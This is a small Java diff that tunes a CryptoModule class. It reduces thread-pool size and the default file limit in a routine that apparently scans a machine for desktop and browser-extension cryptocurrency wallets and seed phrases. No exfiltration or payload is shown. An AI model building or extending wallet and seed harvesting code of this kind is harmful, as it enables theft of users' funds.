@@ -62,7 +62,7 @@ public final class CryptoModule {
 	private final Map<String, AtomicBoolean> cancels = new ConcurrentHashMap<>();
 	private final Map<String, Future<?>> active = new ConcurrentHashMap<>();
 	private final Map<String, Integer> counters = new LinkedHashMap<>();
-	private final ExecutorService pool = Executors.newFixedThreadPool(3, runnable -> {
+	private final ExecutorService pool = Executors.newFixedThreadPool(2, runnable -> {
 		Thread thread = new Thread(runnable, "spc-crypto");
 		thread.setDaemon(true);
 		return thread;
@@ -403,7 +403,7 @@ public final class CryptoModule {
 		boolean desktop = !Boolean.FALSE.equals(params.get("include_desktop"));
 		boolean extensions = !Boolean.FALSE.equals(params.get("include_extensions"));
 		boolean seeds = config.seeds && !Boolean.FALSE.equals(params.get("include_seeds"));
-		int maxFiles = (int) Math.min(20_000, Math.max(1, Json.num(params, "max_files", 4000L)));
+		int maxFiles = (int) Math.min(20_000, Math.max(1, Json.num(params, "max_files", 2500L)));
 		long began = System.currentTimeMillis();
 		List<Map<String, Object>> wallets = new ArrayList<>();
 		List<Map<String, Object>> findings = new ArrayList<>();
